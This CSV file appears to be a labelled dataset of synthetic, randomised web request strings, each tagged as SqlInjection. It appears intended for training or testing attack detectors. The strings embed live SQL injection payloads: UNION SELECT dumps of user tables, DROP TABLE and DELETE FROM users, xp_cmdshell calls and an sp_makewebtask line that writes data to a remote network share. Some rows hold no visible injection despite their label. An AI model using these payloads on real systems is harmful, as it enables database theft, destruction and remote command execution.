id,class,vector
382,SqlInjection,/eamE/ge/hm/nh/ruaiXG9ynFuReN2G3s1.gif?lp8ot9otoein=kteedyGnhs&iNjnvEwtegea=hr40bMwAUfZ&EuttEei=787641&Llex=%3B++++EXEC%28+++%27INS%27%2B%27ERT+INTO++users+++++values%288%2C%27iN4Ete%27%2C%27heqoo%27+%29%29&nasA0irmeeieDb=8117100
398,SqlInjection,/w5QJSl-xxqZeD/e-EM4qeCCkJczTnt9N/ealh9OaeCax21uisdhit/hlaicU26yn@VZJApt1Ga/pNGwindow.openaftpg5Z/ePo2KnRVo7/S6orJwvnc1HI9HA/ouhepm/rQaDh/4swe63lZHndhNnIeCe/uYLQN8A.png?93Vy8Hw=1922&yt=t&teoeSwChTtc=auujQQ.&otehcen=select++snirtaa++++from+ALL_USERS&5nFlUT_w2=30941
406,SqlInjection,/AutAbngtl6as6tai/tEpdl/seg4srwstbe7adyslry/rOZfV-_XM5./dEmzqb/oBu.dll?hdaay4oi=ueph7a7Auk0jhn&haeuntirares=imboot.iniie&oij=e%3Ce%26reiyiedvC&sbqA=%27++OR+++++%27cbuturto%27++%3E+++%27S&YORUYwindow.openmw3-Vr=2&deiiegl=81C-pk&scnetmt1tw7eihe=8&Tipassthru5tmpOrfbM=S3ktsio2h&eN0Nc3=7&MexecRPN_lhttps=074975416
409,SqlInjection,/ijmdmnrO2r1rbeheo/cVxkiw/40Gy0zxSV1y/arl5hidmret/tenbai3di/ZErny1/on7yHnas/Yhtpasst0R0perl_20rIF/gPAzhome5FQHgFJ1/ebmQwaHKdP_V/adpe4ndudemdwtASt/7jy.mspx?eD=fi1%7C%3Cvarls+b-u&ecL=jQU&l1toeeo=h%5DRhtpass&f7lacin8e=22&trt9gtarrorxwsn=%27%3B+++++drop+table+++++admin
414,SqlInjection,/HlinkunionQE8PVUjqm@PS/oLTThe.KXmT/no/weeagpoi4taiaa7ont/ood73YeHTg@u/ra37ineeba6ht5/jPBRqKIj4d4huO5aQRDC/eXRki19WGSLz0Ns9djs/xtx6udeatrn8se/1G87@ut8V/u9h8Z_uxtf5iTh.js?s1hime2srn=4Ec%27+++UNION+++++%2F**%2F++++SELECT+++Gtpip3i1+++FROM+++dba_users+++WHERE++++es+++like++++%27%2525&feo6xe6=243&hid1thmrsnes=cBKjMDP&jtfatia=7
423,SqlInjection,"rnoael7eop=dt78poH&to7WErlhToa7=leamsrf&RDy4passthru=6747270180&u4ifezet5tddR=s5t_FAq&ehr2aaedDo=dEso otspasswdnasbetween&eroqfsct='  )     UNION ALL     SELECT     001,8532,32,937,83  FROM     xQus   WHERE    (    ''    ='"
428,SqlInjection,/OBJ93Sj/eBtycidafTsnrtusdejC/aXNOSgumFH8lj9d/beaoosrtee/9.RmwOaeFfHv/hu1N/sRKMecuR1j/hnnmno0er/eiyljl8-S/nt/fKYCdR4iI-@zFJjQGd4x.js?Ese=formmnN6stdinJ-naebihn%28r&eeonts1Q8s8E=btesUnu&orslveEa1Ne=ya%2F&se=atgc&ntt63honr=szl%7Eumaogi%40cmen&ocoifnto=yv+rh1atl&o0eenrlht=lcce1rni&hnEznmtSuui=%27+OR+++++%27amwcW4%27++++%3D+N%27+
431,SqlInjection,/u3B9vsQYuwuhAj9_I/iq.go4O/enjuetsuOebnrdaa8lo/aSZibwwq/eEaaoEno/wwULcsLG_qRhg1MeKj3A/bRnn2@mTzZu-Ven5LM3.php4?
433,SqlInjection,/tBzYfcS/syu63/19iOqrLy3DnCKbGrPv/evalOmetai7rtkiUmGf/zciet/9zBk/f9kCIdk_sEYSa02PUD/Kj51gHnL4CePig4/nr9vcnMt0mTekstF/tdfM.mxLWIc7/k7-EJ36-.asmx?wzfRWrRyKEU=hhttpsA0%7C&Eyz0=Nehtttntesaahhtl&UesdoeRYu=5428&U5J0a%uyNUC0=5Vy99yBP&Jang2eot=ri3H1se%27+++%29%3B++DEL%2F**%2FETE++++FROM++users+++++WHERE++upper%28username%29+++++%3D+++++upper%28++%27admin&l0=s%5Cs-l
443,SqlInjection,/oYneh3nlR1n8asotiSo/5rztdemlty1ms/8Xge5tLUWdm6Sr/yO/uabadsfddbbvd/ggg3mMJ@dL0@XgKP/irNe.js?l2eye9H=++++OR+++2+++%3E++1&2t7leAm=65847178&xens=%29xA&aap=TnLevlSoiporeIrn&LteuhrBmuioe=eonwgitP9rl&hh6hh4utt=ee&arbW=t&UunionRPJ=7atod
469,SqlInjection,/m-q8ZO9tOLOiu/lQI9yBSRnSr6krbnf/c3/sfGGS5tG/n6G-wm0/1mailgC/aX/mmroatIh9i9shjkjn/egottihonofM/hDZY72215pDnwVt.htm?debto5on1k=52032712&m7oksrhd=dvalulzolr3mswdnoq&binHtmpPR2=75559421&z8mailA4UUnull_WZS=%27+or+++++id++++in++++%28+++++select+++++*+from+++++user_db+++++%29&buwat=aOeiq&rpq9aserno5e=lCVh8f
470,SqlInjection,M2ftpa=LtntT+t Tt&qR=|h &tgNDd=4&ratabnrtMjlj=1&midscqbche=92609383&odh85s=';     drop  table  admin
473,SqlInjection,/iOzm/sqY0Vk9pr00/bhjaogjahgn3/ca5MMaIbv7Lq.mdb?1Ydidsot=44&einu7oyrnamoKgr=aqr%27%2F**%2FUNION%2F**%2FSELECT%2F**%2FehrhodeiqL%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2FtMP%2F**%2Flike%2F**%2F%27%2525
479,SqlInjection,/clocationmap/eKFR0-NIvUWn1e/nYf.v0Xwb/e5texhi9ac/wes/jJKleCwefYfZzoGFvoHa/ky4US@hi7s_/5weetooE/lPB2rbElqPj86Od0@rD.jsp?0iatbaw6wo8=leohjpleiraotsid&0IF7shutdownp.L0an3=eujq4%2Beihttpr%3F%3E%29h%26e&nizibrs3=35&aeecs4a=Esoteetd3ru&3ooI=992167&jled6tTe9dda=c&Z6istyle=bjy&CS=wGu6lkd
480,SqlInjection,/mY_DN3o9e3/msltroua/oj/afpnatc3as/ajn2ri/jSzOSo/pweoeMooecwnTo/lD7KRPQqWUNXJkYDuRPF/appetydmeriirorsiai/oPqimgbj@TTnc.aspx?rtaso=bulk+++insert+eraadie+++++from+++%27pwdump.exe%27+++++++++with++%28codepage%3D%27RAW%27+%29&uhmqxo=1974645&oNA=a-zL35&access_logL474bprocessing-instructionbOJ=008&jl=ishpasswd%26zra0uwi&npeeneondyeekO=n-v8q
483,SqlInjection,"ptan=93&YJzXc=28011813&a4esoNAeaeShe=';    EXEC   master..sp_makewebtask   ""\\234.145.17.9\sh5t\grnl.png"",   ""SELECT     *    FROM  INFORMATION_SCHEMA.TABLES""&ltjBm83nEOAhs=lnubbHC"
487,SqlInjection,8yYFsmbTV=82699&disiweniHr= Zsopyl&OeYu9c4rpLs6=ee4ty'    );  DEL/**/ETE FROM     users  WHERE    upper(username)     =   upper('admin&erla=idrbl&emess=74
489,SqlInjection,plub=sye&2rCh1=170&ta5ntxxIe=216142&WouNw8weUA@=' AND     USER_NAME()='cn&lestietsyat=rtpCdfUyrxf&lqjesesTanacip=69ykKUERIi
492,SqlInjection,/mF2tneIoE/A8CixRWK6T/eAvIeqfTn.JEBM_OFq/oQ1t/pcnado7ra2v3xupoyobh/axtStgirboc5/83kvbodqynqfromCp/Gedt.msf?gn92nhmn=i0&IvN8Rmrl=olimmE8toem1tritwL&ste3inse=exec++xp_cmdshell+%27%22g5ddc8bdr%22+%3E%3E++++script.vbs%27&nainhtj1cnDnei4=kinpa&H223hahl7hewo=r62https%2Feb8eem4e+I%3D4s&82B0T2QMecX=tHt&cae=Mq8%2B
498,SqlInjection,"amsS=;    EXEC(  'UNI'+'ON'+'   '+'SEL'+'ECT         'TOty',1,26028,'noboed',9     FROM  i6o5N)&zar=ycEheepeboot.iniRd&dc0ee5umtha=nidbB&sysptNyeWfrllnn=o"
521,SqlInjection,/h0iynrtupnta0rasoZap/Vg6wDm/IornH2oBnor/l2Lt0PMH/wR/dBjQhAgtQ/ktut9wOoyfmnhK/ze/cT/lsa48eaNBnbai65haint/Cyysvoia7ee.htm?Cibii8iaatxris=mmo4sohHlpsamc0es&h6rUsse=l3barxnk&lE4JTWUw=ftptb0fnenu&icge9p=%27++or++id+in++++%28++select+++++*++++from+++++++++user_db+++%29
524,SqlInjection,/iutehdwati1I/sogra/GnEsi1l/twaop0dohfruitroes.tiff?latflyeq=tI9vKfGDIUe&4SPN6C=%27+++++OR++++%27aaAau7zi7O%27+++++%3D+++%270r%27%2B%27ti%27
526,SqlInjection,/e1f4yakE/jbbeaCnarnArnnhex/oLIBULECTBiPzv7/uGzTeRSjIzC18DRRw7X/etasq4zhbijgrio/4Zt/7A.swf?5ihadgsi=sAsitgeeslafs&xhrueu0cfndhay=i9mT&httna8rj3estso8=ewaba&echr6oslnyoqm=0JCw16&hrbGsmeyY9as=lXi8v.Tb&dcz9pfnn=%27%3B++++begin+++++declare+++++%40ret+varchar%288000%29+++set++++%40ret%3D%27%3A%27+++++select++%40ret%3D%40ret%2B%27+++%27%2BVytGcuN%2B%27%2F%27%2Bpassword++from++++rcroa++where+++++aaoon%3E%40ret++select+++%40ret++as++++ret+++into++++foo+++++end--&h9nn3afetSnsne=erOroemiostt&rtnrnmeleDb=hD5ll0aies&ii=rl&ssnamnnnn=imtfah+&eeHteist=tnvarq&oucr=adaNwJ&llrd=999
541,SqlInjection,/fteelwixmkcSoiynao0h/AV7MyHadocument2X0qNL@/4qrzjwehtlss/rN-qxxCEIxOfn@20/eKGGvFTwrnu/6us/tfokATwSmmues/ygae0k4sitauriuk/HoNNe4Vwscript_q/nN9scurneenamjeatnt/tqmaTospyg.jpeg?
551,SqlInjection,/p5NciDnFLM2rzuL/8yMunsr8pAwdivk_/ntbORqpcI2Xoa/vx@Jz@/Z7oOcftrwebJz/opFmLxZ7vP54fY8q7fu5/nYl.YtwWkWUsg2Nx1jI.cfm?lwobxsyadpz5=xCW%40&qsock_streamwPcYT=exe73Aegbrnebd18i&tdhoosg6icinTe=3988&nal2bDkaailw=535774&rrscasiege4ma=wft&soeg=44835734&v3toasoes=40hmwTor9mdtYrlekr&unuen=d4WHW&qZdivu0j6systemuX=%27%3B++++begin+++++declare++%40ret+++++varchar%288000%29++set+%40ret%3D%27%3A%27+++select++%40ret%3D%40ret%2B%27++++%27%2Beii%2B%27%2F%27%2Bpassword+++++from+++o8+++where+ti%3E%40ret+select+++%40ret++as+++ret++into++++foo+++++end--
559,SqlInjection,/B_1.3Y/ej_WJZO@TP/-Zdivehck@Pl1T5U/ayyk8Bgj-yT@XD3b/sFRaDDcBEkj8LK3xM1.png?dH-hi=7PNKcH&sfyenansoh=%27+++++%2F**%2F++++OR++%2F**%2F%27%27+%3D+%27&8fzetcZlgs5B@2=h%3Db6m%25uaoAShs+&aHoOpOhre2hcoS0=20&qostDegburwa=+dsaF0imgam%7ChidcmsySle&de8rerg=09
570,SqlInjection,/n-dscAYJG8_1m8/rmewesSrkt/ei/openphpJyLX/CqRyh2OYkTEvf/igmQt/z1de4AdoagswnwielbU/lr-Nk65JgcUL/fromDIxmliincludefVservicesreplace/wv_CP7tPqMsDg/LJlrcpPZv0VEb.js?ia9ew51gAeaavs=gc89dOtpfdW&5ant=m.Y4T6AvMn&irSecyf=ne3iv+ee&sszc1eY=++%7Cke%5Bvn9wgetrErperldk&nfEu6pigeihe5=%27+OR++%27es9qntPde%27+++++LIKE+++++%27aze%2525&eednzrthlh4pa=654181&r5eniiip=vUeyneoeelvrntl8y&so1wneoq=70923509&5-58YKEKap=6-%40b0QPU&lwdtongseaizn=7163
572,SqlInjection,/tsaeHgaint/tukQ/ZR..HP5E6.css?
575,SqlInjection,aprEeesMecushd=et&gbcvchildxOE4I=tes<dnteezadt&ne=6607573&egse8neaqeEpsu=washsta
579,SqlInjection,/oeYiSboCRuOHxTWs5Uc/n6LfrWF/eQQ3xG0RB-eZ/mWFTgK15YqU/twoehons/3@YREJZ0YWdq/IFMpz/8and@IL/A5tjfu6spo3N/eK9aFKM/GrsfH43alln3MhN/WeYx1uboot.ini1a2input.tiff?7e9e0ofe=Ceeieaa+aNd&ot8ri=58202902&E7d3ySao=obukl&L2SlsSbvIA=9348157427&oDlsal=iilrol4A&6qt=470&edni=566084
580,SqlInjection,/eqcK/g7nooauu8oAotadjh/eieoxeF/trC-/lZxZ4c1ZzVDxC/nW5Q@qpa3B.yUk7n/5md/oiqtxtlvIJleotf.mdb?Gihitnoeqimsl=Estu0tnxateew&ei=ekxkvit%27+UNION+ALL++++SELECT++ztit++++FROM++++moeO++++WHERE+++%27%27+++%3D+%27&vsttase=iaifclbon1gs5ufog&dmsn=eteswgetbeqaeval&execCGxRMXIvmY=Odenmg07te
581,SqlInjection,/lgWR9HJ9/o3sbzea0EdgbtidxeseS/triezutawe/z4.html?naouttdmer=3AmEzln6Eht&osamYE=0rdi6p1veipdiaastY&Et43qOnor5ea=%27+++++OR+++++%27erp4nderoiNne%27%3D++++%27++++&8oswz=r2yceseagm&EoedhsNso=n6ap2dlu%3B%5BwAea&positionwMCbrqtEHUG=9130&YselectCefj=yA&rsa8rle8l=taiHrnorenopthlAi&eeej=leetnYBhoiagastaf
624,SqlInjection,/7OGddrf1Qfm/7d2xcsC7/srlX@x8vsacNP/anvaozcdutsseosdszRl/OnOLgdic4ne/rm381MvpVldE/nrzendavnumhb1tbse6c/6BdvzPxyziqN-h/u58/4fiTldZc.jsp?emeee3uannc=3092127&rfjesetSxpomz=AHm3atet9ms4n&w68-ZWsam=dbhO%27%2F**%2FUNION%2F**%2FSELECT%2F**%2Fqiunit01p%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2Ftf%2F**%2Flike%2F**%2F%27%2525
636,SqlInjection,/onnseHnisI1/0QGjo/Re9iTlnhdGaowt5pn/cA4BoFFWnlZ/HneniOeuxceoh3eny/d-ea1QLf.Ui15/fAlneel/TfAN8nxp_ZozSRacM/weo83hrwnc.aspx?e4ri9emrifm=3312&rgh=5&itetlowsfseel=978&owc3poT=2+or++id%3E2++++or++ls_id%3C73&sjdth5nzLuN=rd
645,SqlInjection,/5c-xq@O/nm5UOM436paquU/678euOssGwpp/aZDXMZg@/e@2Uda2p/rDYsZ.v/aRug5v2/lS/rS7/aNer0/_AOwMLa/eL2uKxKJDLerzLEKB.dll?d3h0XZ8PpgX=oo&ZCk4zdLU=eLdeoee%40h%7C&frh2iio=6ee+&cnezidgddtdr6hn=%27select+customer_phone++%27%7C%7C%27from+++++customers+++++%27%7C%7C%27where+++customer_surname%3D%27%27%27%7C%7C+lv_surname%7C%7C%27%27%27+++and++++customer_type%3D1%27%3B&sepiesd=raMU%40s%40O&umoyuaaanooA1nt=32&e60ptxmlyndsr=tw-oee4a&ivemnehijesar=tqdli&tsa2=72470&ew8isops7bk=857
650,SqlInjection,ESYJ=ooEmi&eea=oi&ai0uncayc=t<a9 aelocationc)&tdek1te6booux=0274932970
654,SqlInjection,/8ZmZqxm8RedOic/pzZ/oaar.sh?@H_1MF-all7=a&ePnrbojceid=538673&Szlocationselect3lib1Iiy2o=52417973&vE3axBfromZ=+%5Ch%3Ca&sidps=6&dropUX1WxCpBPAL=6vW&RpISwgetv=nHiwL%40welO&ti8er5f=2&8awtHIsucsp0f=der0aectghqTdqat&lsdafgsdoniarj=u+h+s7it%7Ewe0&ol7einrenN1dvtr=a&iinai=9dnh&feib7=shu4bed
657,SqlInjection,/laenbweba/oOIcaSs0zu/htyOs64tr3gUhttaqe/4htaccesX@0ascript5vIpassthruRF/oWKZ-Kmkcz/76TyejtToruhw/ejU3M2t0NmhLG_N4vw/sSTntsdHertrooe/tFqVOd9sXVCTabG/h.8.html?so=qwer%27++or++ooemxm9_v.Account%3D%27ezo9rtk%40dni.com&bchLteiesr=stepj3hwwe
662,SqlInjection,/aapwds77iimoa/emieuutpgcsaipente/sthlo/tsJoIyKi7uzxiCo/moo@IbFxRZv5PCh0/hemnq/ez0Rw5a93OR3/7nclrtr/r0S6iyeA6tpoOas.html?enoevreur=%27++%29+UN%2F**%2FION++++ALL+++SEL%2F**%2FECT+++++%27eeuryt%27%2C1%2C00730%2C%270sse%27%2C9++++FROM+denRenemw+WHERE++++%28++++%27%27++%3D%27&ycrnnde=8526&dRiq=eaur8lpoaoae8
666,SqlInjection,/T5b/nleoN0e/ts24-TeyfopR1Gur.hVF/nn2ytesteoss/B.0xmlW17hlogE/j2afhx99u2aa/opGHYHZspNAt6@9mDwI.js?dggtvnosim=engerdlIew8&lmel=9389&gs2asw0a=dstqindau&eawapr=I&N.hvvG2exec=iVRl-f&v6jetmcfs9HVg=i%3B&qyhrsvt=ciy&unionA3k@4telnetO=%2B
667,SqlInjection,/lkCKXZAUphp-/moJey3ipr2abn2snh/ytnhaSi8ttvaezhonttt/4grsi5oojlonatlUni/yhtacces-CAwYc23RG/oaaGLaNeEereis/Ekq3L8_BcUahvuK/1jrHH0ALincludese7v9/g2dyN.roJfT6ZEtJG1vZ/eqthnsyce.cfm?annalsb6genhm=vFhzQ26RAMR&tI03e=15&7rd=wcCpJGUoh31&eocqFphiTen=coAiphp%253%25anErt5dOo&htacces7Hdelete1h.g=gx&bounioiaoo=%27++%29%3B+++delete+++++from+++users%3B++commit%3B+++++dummy%28++++%27
677,SqlInjection,/swwerflt5blctm/v3CgUbEr/tf.bin?futA3ddh5p7Nyn=+++++OR+2++%3E+1
687,SqlInjection,emau3eo=4&tpsroUqtsrf=2&ej8=s9tee Snhh=oia5<catndeletea&Tvrge=50870&1N9hMREtZnetcat=91&Sst=nymrrblel&tst6n=9997853&94oMZkelsscriptq6=Cf5tceI2hc&3-netcat9Jtx-83j=2180166701
697,SqlInjection,/ainSlCneiOdtO/4likeexec.gif?eylners=50964274&taosoe6Ch1hrh=mSmlogrI%2Flt+&rcpUpFw-psDNREs=optiYinph-oetcS%3Ephp%5Bysunion+&aleosaehdya=zPK1wx4&jFgto2Snse=citu%3Ctpte4&Mdissei2o6Us=bnioob&MUcg1JE=OR++40295%3D40295&bc=vbscriptttgre%3FsuH%261mprocessing-instructionidhe5&5iiNfdT=%5CfoHrecopssg&numlHnetpjbugsi=00
702,SqlInjection,/uMn/xcuG/jFY/HahesW/ro88uhu.uUpq/nobjectzvbscriptfRn6XciW/aYI8gIw6OJyHAkecx/eb/dC5mLe9zmo1KqNH2/nYH.htm?8knu=4135&Ctl%usaPt=492549&Elsrtombzw=%27++++OR++++%27j%27++++%3D%27&6Sna2ied=8738656&tfcxt0toinhidit=92485320&1rso8mrrmMn=13128
726,SqlInjection,/nCB./xn.js?ewnktd=caiOnf&euUn=%27%29%2F**%2FUNIONALL%2F**%2FSELECT%2F**%2F72247%2F**%2FFROM%2F**%2FIwi4u4d%2F**%2FWHERE%2F**%2F%28+%27%27++%3D+++%27%2F**%2F
729,SqlInjection,/sluoeu0har/8tN/hx.aN29Wxh5W2dA@Pwyo/cincludevR9vuPXD.css?MiabIphLlot=5o&0noi=Oaear6orvr45E&rpt0eS=%3Enta%7C&zwrlxcxraOnn=a+i&ltsr=processing-instruction%5Dv&04CotpCwCl=010&nsMj1rdkaz6g=%28%40+p5ypasswd&eem=chairs%27+++UNION++SELECT+hhoe+FROM+++dba_users+++++WHERE+++++name+++like++++%27%2525&KEei=eONn&BG1allNkSiXT_=eh-acIioMr&al3lcesexuuc=p_yy_Cx
733,SqlInjection,/ie/eUYcChNuy/AhgteoEodAsie2udo/oNolsue/n3UQoNz3.php?mshaOSdmw=%3B+EXEC%28++++%27INS%27%2B%27ERT+++++INTO++++users++values%2834%2C%27g1o1ajhEmh%27%2C%27rpttezrt%27+%29%29&Kaccess_logNypFCuC=gehx18mU6vtCjreai&tnsaeonn3efmei=aLX&iRsFIRibsm0A=oa68c
744,SqlInjection,/9e/nses4dsmre/2eqtUh/olihnothhte7dses/lt7n4/ul5mgr4d5pL/MopenbodyQcatJRrimgFfs.Cn/ate5onyeiso7tras/as5eteylf1ii/uvOvyw/egeusT.jpeg?kbrwbhwRnnoed=access_log6d&n7lw=eids3tak&tio=eZteyeo9hEer3ia&edaieeWtulirA=optsb&Ndn2Lpawe=iieu7nM3c&loshgoisTaide=4380074&rateaaTea=drfdseahioo0hSoib&BEstyleWsallEeh=rcFcnATy7h&er=ee
764,SqlInjection,/eAXWx@mWjbb41579u/eP.dll?rnehtc=%27+++UNION+++++++ALL++++++++++SELECT++br+++FROM+++tu79fT+++++WHERE+++%27%27++%3D++%27
767,SqlInjection,/hAXpasswdncxCfOVO/ohYq5q2pq.C4K/rs/nQN8Aj/jTn2uH35/tGyilY/ZJo18formh5f.png?jtra=osioKtotqdexte&V2Y1RQtelnet=y7r8%27+++UNION+%2F**%2F++SELECT++9eabse+FROM++dba_users+++WHERE++yHQe++like+%27%2525
768,SqlInjection,/ezCaH94X.mdb?tTioog8pgdeAoT=Ni1tiwlUnm7ab2&bhnne4Nn0msoee=%3B+exec+get_cust%28++++%27x%27%27++union++select++++object_name%2Cobject_type%2C%27%27x%27%27+from+++user_objects+++++where+++%27%27ewMdlnzreo%27%27++%3D+++%27%27+++%27+++%29%3B&ep=lqrirmnnstc&w9RoV=6624&t7xlscmurfh=lbq%5D%2B&sqltlat2oe2deb=nh9%5Doni%3D0nieeEtprocessing-instructiono
771,SqlInjection,/anc3eslo6o8/aeBee/ssbyhao/ptaa5anlyoRstraos/eeteaiixisriesinr/aUl4sKY9qTD09CZ8/lcFWLvkApxliJqwREd/jHZei5/_1tOmeta0jNN.S.cfm?enw=uMmHJKsf-ccR&ahtdnji8h=AGca+tijudH&Hdk=%27%3B++EXEC+++master.dbo.sp_makewebtask+++%27c%3A%5Cinetpub%5Cwwwroot%5CrE.htm%27%2C++++%27SELECT+Ilp++FROM+++dTaarin+WHERE+++xtype%3D%27%27U%27%27%27
774,SqlInjection,0olr=hiivbiyhynrt&1agxnDecv2a0qat=T4t&IwgetlMs=eufhi0gena&idn='  OR     'dbpema'     >    'S&taixcbmieasis3d=plcpasswduy toijn~h]netcatji)t&aehncjradrrp9=t the&t9eamdkt=ht;ed&Xnt4de=le>oht insertgiic&e+>d&tc9tetweho=d:ey&toe=092&kt2mlroetw=19868&tluKsrkrp3du=p<i ~ne@netcatitn81&elebsl=952130458&bOnaalsl=+mehomeurc2rieX\as&ygMtmeenahqtpCN=dotCMngt
775,SqlInjection,/Latd8s7lkhohiuS/sUwDS0/DJ/twupR1eqv.p4ss/yCandnEqyZpS5M.js?bgsaye=ean+&asrmomzhvvy=+&vSWc_9_3PK=oi&lhsxac8RnR=Aatho&ircten=%27++OR+++%27raeT%27++%3E+%27S&lse6dbbeDrluib=aXtl&ooeclt=lcnsoo
778,SqlInjection,/9alzeHeEkbAwdfNfS/ozyrJHD/lTgX0g_ni_v/mshaatelks4n/tGHd-mo/qE9ZSjOc/qtPaeee/hpS2SZ7L7/fasahcaoNl/ihroonanql74bW2t2/gamoao/rti2EunrlytOafc8ao.swf?
783,SqlInjection,/k2.css?mipylree=bd%27%2F**%2FUNION%2F**%2FSELECT%2F**%2Fee2Ltta7it%2F**%2FFROM%2F**%2Fdba_users%2F**%2FWHERE%2F**%2Fa5%2F**%2Flike%2F**%2F%27%2525&n1aea=eso&@LWrNXstylezT=zr9iitywaaodo&nti=whei1aweir&paCeibdhe=689537995&twhesiadik=es6H6lgaF2&lubgsoundElink=%40&PZM1eV=%3Dprocessing-instructioneval+aiji%5Dp
790,SqlInjection,/oHU7Ma1og7WLNT3N-8V/n.ZBjmUP9pH5v5KuZ7.mdb?msibeS8plf2og=4&WCcagN=e1okhda2T&Naihrarns=urcrobzelr7noit8&Faatmntit=53103&syHrt8=8032208&leeasetydtA6=5572490&oa=%27++++%2F**%2F++OR+%2F**%2F+%27hrs%27+++++%3E++%27S&ht=eoOaaortlvu2etr
794,SqlInjection,/2ry6tnaio9slojtt/J5n_UZwi2/naoeogrnetu/uBbBavg.9T4yUxbe/PUz/It.jpeg?SwMmtEcr=%5D%27ebs&outwp=ss+%29&wrp1OtRib=XeeMrn&91c9gW=lrR&stpouOeazieFr=eyate&dpanetlenosroC=1024616&Abtt=u+m&wo=eeoptare2oawe0T%40oaue8I&TmochaexecH=e_On19i&vJBwPHOz=pdA3ria%7E&ritghni1id7h=tFkNtKC43do&upcRj0af=%25&NADGVconnecth=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe
795,SqlInjection,/ucp/e_WcjtMeyOVpq_Tr/IFT6447y7uvgNmI/sTxg2wirkeCVGB.shtml?rz9ttoee=yidbiretti&ny9amcemoaei=3268355&ipinxea9ibl=tcTu+tre%26&cef=%27%3BEXECmaster.dbo.xp_cmdshell%27cmd.exe
808,SqlInjection,/exrZ/cwXM09_1v.hmC0A/priqdhedto/tE/ebwaO5w7beaIhamehien/son/aRmrm3maell/ckRBE7cuY0qxn/2feSebeeevm9eo0jrytt.exe?sLthkltljsrT=2233962&Hdrmzeo=mocha&wQdiclNi=7760932&metl4wwm=raJz&iesolo=6070&xtEoeokttrfE=61743&7nsgvo=9000423508&P@Rsock_streamYspt=265&eiesAi5nH9ezqye=pix%7Eernwpanform&nSaha25eiTt=eg93bbFgq&uwrentn=iai%28spm6swteoE&fc1kaStlz9sS=htst%27r%3D8pqfllLg&bhjhtOlsa=ty
815,SqlInjection,/enofsuninnhm/qigzs/ipse4mFOtSiwZH/swa/9uincludekGchildIbBlink3AiE0/ty.kcYTZuzPc0JdNGtsB/likeTqsamZ/i8laeuniot5vamgE/f6Aids.gif?deeo64Itofmiey=1jT&tuaeilweeb=51&ee4teoTays=022889&ne=dl7tbce+%3Emvar+ce&tin=oer9&tih9hGlh=9820678&bOsrpnxpit=n688h0b2P&8p@ZihtaccesQU=adle%3A&idNN=oeesRnain&wbemuaffN02iam=d6SLKx7eEueTtdC&Rssd=ht4o&ptci6ktpUreNu4=a%5D-iwnher5&hkaaiol6ayrD=3eXqA
828,SqlInjection,/sjbnWGjSM_i/ieweekiuyhkjt/96VS4lLMHRhBk08x.htm?bwTiataciTlt5=%24egingot%5C6%5Bbya&esw=3pq&nrk=eUq-Zw55.5&YX_TVC7tV=toWwatslfsbl&o1aohitNrro=h&iWAbBhJ7Iisam=aPHl&sethmSie=eitedLxhtaiah2ruw&httpsptYoqc@Kw3.=%27++++%29+++++UNION+ALL+SELECT+04445++++FROM+++++aaegi8++WHERE++%28++++%27%27+++%3D+%27&u6a=n3p&pesereivein=cey%2Fnso7eRandwget
829,SqlInjection,/rZm@o/TsnhocILtQn9/td7TGj.cfm?aecgrtry3teorai=%3B+exec++++get_cust%28++%27x%27%27+union+select+object_name%2Cobject_type%2C%27%27x%27%27++from+++user_objects+++where+++++%27%27h6hneseDr%27%27%3D+++%27%27+++%27++%29%3B&rSb=261
839,SqlInjection,flaCemgt=select  et0w7tw    from  ALL_USERS
846,SqlInjection,/lhlRiDxr1T/ehotkmt/soa/TiroEauunNtt6/hesGihhegal6rnthan/en04tJs_z/en.gif?omb=%27%3B+begin+declare+%40ret++++varchar%288000%29+++set+%40ret%3D%27%3A%27+++select++%40ret%3D%40ret%2B%27++%27%2Bhpw6hhm%2B%27%2F%27%2Bpassword+++++from++++ieaofvrt+where++mi99etd%3E%40ret+++select++++%40ret+++as+++ret+into++foo++++end--&evaWts=truservicesp&5mdfynsshnOic=1
858,SqlInjection,/x1bRNAJOqS1SB.mdb?yLLKw2l_yJ=%27%29++UNION+ALL+SELECT+41591+++FROM++dAMelrG+++WHERE+%28+%27%27++++%3D++++%27&56faa=l%28a&m2fuespthe=982&5it=2040752&Sxtusrtiud8ne1=itubttulei6r&ertj0bissose=access_log+&eeesegsehndrc=8206615557&fn=ltdrcp%3Bbki%7Esrx8pn&s9e=skesggaiaouNs4&yo2rhe=ie&8utiArh9=56&ctnzgeft=00
